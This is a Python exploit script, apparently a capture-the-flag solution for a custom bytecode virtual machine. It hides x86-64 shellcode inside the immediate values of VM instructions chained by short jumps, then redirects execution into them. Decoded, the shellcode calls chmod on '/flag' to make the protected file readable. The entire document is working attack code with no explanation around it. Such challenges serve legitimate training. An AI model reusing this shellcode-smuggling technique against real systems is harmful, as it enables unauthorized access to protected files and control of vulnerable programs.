import struct

def p64(val):
    return val.to_bytes(8, 'little')

def create_inst(arg2, arg1, opcode):
    return p64(arg2) + p64(opcode) + p64(arg1)

REG_A = 1
REG_F = 32
REG_G = 64

OP_STM = 0x40
OP_IMM = 0x8
OP_JMP = 0x10

SHELLCODE_OFFSET = 0x4f
TABLE_OFFSET_GAP = 0x808

chunks_asm = [
    b'\x31\xc0\x50\x90\x90\x90',
    b'\xb8\x66\x6c\x61\x67\x90',
    b'\x48\xc1\xe0\x08\x04\x2f',
    b'\x50\x48\x89\xe7\x90\x90',
    b'\x6a\x04\x5e\x90\x90\x90',
    b'\x6a\x5a\x58\x90\x90\x90',
    b'\x0f\x05\xeb\xfe\x90\x90'
]

payload = b''

for chunk in chunks_asm:
    chunk += b'\xeb\x09'
    imm_val = struct.unpack('<Q', chunk)[0]
    payload += create_inst(imm_val, REG_A, OP_IMM)

payload += create_inst(SHELLCODE_OFFSET, REG_F, OP_IMM)
payload += create_inst(TABLE_OFFSET_GAP, REG_G, OP_IMM)
payload += create_inst(REG_F, REG_G, OP_STM)

payload += create_inst(0, REG_G, OP_IMM)
payload += create_inst(REG_G, 0, OP_JMP)

hex_string = "".join(f"\\x{b:02x}" for b in payload)
print(f'b"{hex_string}"')
